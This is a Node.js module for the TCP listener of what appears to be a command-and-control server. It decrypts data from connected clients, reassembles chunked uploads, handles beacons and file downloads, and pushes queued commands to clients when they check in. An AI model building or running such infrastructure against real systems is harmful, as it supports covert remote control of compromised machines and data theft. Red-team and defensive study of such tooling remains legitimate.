const { createServer } = require('node:net');
const { logInfo, logError } = require('../modules/logging');

const config = require('../modules/config');

/**
 * Creates the channel connection for net.Socket
 */
const server = createServer((socket) => {
    const { getSessionId } = require('../modules/encdec');
    const { addClientSession } = require('../modules/clients');
    
    const sessionId = getSessionId(socket.address().address);
    
    addClientSession(sessionId, socket);
    
    socket.on('data', async (payload) => {
        try {
            const { upsertClientSession, getClient } = require('../modules/clients');
            const { executeQueuedCommands } = require('../modules/queue');
            const { decryptData } = require('../modules/encdec');
            const { handleDownloadResponse, handleResponse, handleBeacon } = require('../modules/handlers');
            
            const payloadStr = payload.toString('utf8');
    
            let client = getClient(sessionId);

            if (payloadStr.length >= config.data.chunk_size || payloadStr.includes('--FIN--')) {
                // chunk mode                            
                upsertClientSession(sessionId, {waiting: true, buffer: client.buffer + payloadStr});
                client = getClient(sessionId);

                if (client.buffer && client.buffer.includes('--FIN--')) {
                    const bufferChunks = client.buffer.replace('--FIN--', '');
                    const decrypted = await decryptData(bufferChunks, client.sessionId);
                    const parsed = JSON.parse(decrypted);
                    const response = parsed.response;
                    
                    if (response.download) {
                        await handleDownloadResponse(response);
                    } else {
                        await handleResponse(response);
                    }
                    
                    upsertClientSession(sessionId, {waiting: false, buffer: ''});
                }
            } else {
                // non-chunk mode
                const decrypted = await decryptData(payloadStr, client.sessionId);
                const parsed = JSON.parse(decrypted);
                const response = parsed.response;

                if (response.beacon) {
                    handleBeacon(response, client);
                    await executeQueuedCommands(client);
                } else if (response.download) {
                    await handleDownloadResponse(response);
                } else if (response.error) {
                    logError(response.error);
                } else {
                    await handleResponse(response);
                }
            }
        } catch(err) {
            logError(err.message);
        }
    });

    socket.on('end', () => {
        const { getClient } = require('../modules/clients');
        const { upsertClientSession } = require('../modules/clients');
        
        const client = getClient(sessionId);
        
        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`);
        
        upsertClientSession(sessionId, {lastSeen: new Date(), active: false});
    });
    
    socket.on('error', (err) => {
        const { getClient } = require('../modules/clients');
        const { upsertClientSession } = require('../modules/clients');
        
        const client = getClient(sessionId);

        logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`);
        
        upsertClientSession(sessionId, {active: false});
    });
    
    //socket.pipe(socket);
});

/**
 * Starts listening on the socket 
 */
const listenSocketServer = () => {
    server.listen(config.channels.tcp.port, config.server.host);

    server.on('error', (err) => {
        logError(`\nServer threw an error: ${err.message}`);
        server.close();
    });
};

/**
 * Returns the server instance
 * @returns Server
 */
const getServerInstance = () => {
    return server;
};

/**
 * Closes the socket server connection
 */
const closeSocketServer = async () => {
    if (server) {
        server.close(() => {
            logInfo('\nServer connection closed');
            server.unref();
        });
    }
};

module.exports = {
    closeSocketServer,
    getServerInstance,
    listenSocketServer
};